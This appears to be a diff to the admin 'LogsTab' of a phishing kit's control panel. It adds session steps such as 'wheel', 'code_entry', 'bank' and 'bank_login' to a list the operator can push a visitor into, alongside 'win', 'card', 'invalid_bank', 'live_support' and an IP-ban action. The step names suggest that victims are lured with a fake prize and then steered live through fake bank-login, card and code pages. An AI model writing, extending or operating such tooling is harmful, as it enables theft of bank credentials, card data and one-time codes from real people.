@@ -660,7 +660,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       return;
     }
 
-    if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
+    if (action === "win" || action === "wheel" || action === "code_entry" || action === "banken" || action === "bank" || action === "bank_login" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
       await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
     } else if (action === "ban_ip") {
       const row = rowsRef.current.find(r => r.id === sessionId);
